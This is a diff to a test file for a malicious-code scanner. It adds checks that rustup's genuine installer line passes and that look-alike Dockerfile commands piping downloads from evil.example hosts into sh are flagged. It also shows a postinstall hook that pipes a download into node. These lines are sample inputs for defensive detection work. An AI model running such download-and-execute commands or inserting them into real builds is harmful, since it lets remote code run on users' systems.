@@ -24,6 +24,12 @@ describe("malicious-code scan", () => {
     expect(rules(file, line)).toContain(rule);
   });
 
+  test("rustup's own installer line isn't a false alarm, and naming rustup elsewhere in the URL doesn't excuse a download", () => {
+    expect(rules("Dockerfile", "RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y")).toEqual([]);
+    expect(rules("Dockerfile", "RUN curl -fsSL https://evil.example/?x=https://sh.rustup.rs/ | sh")).toEqual(["high: pipes a download into a shell"]);
+    expect(rules("Dockerfile", "RUN curl -fsSL https://sh.rustup.rs.evil.example/ | sh")).toEqual(["high: pipes a download into a shell"]);
+  });
+
   test("an install hook that downloads code is high, reported once; a plain one is medium", () => {
     expect(rules("package.json", '"postinstall": "curl https://x.example/p | node"')).toEqual(["high: install hook that runs downloaded code"]);
     expect(rules("package.json", '"postinstall": "husky install"')).toEqual(["medium: new install hook"]);
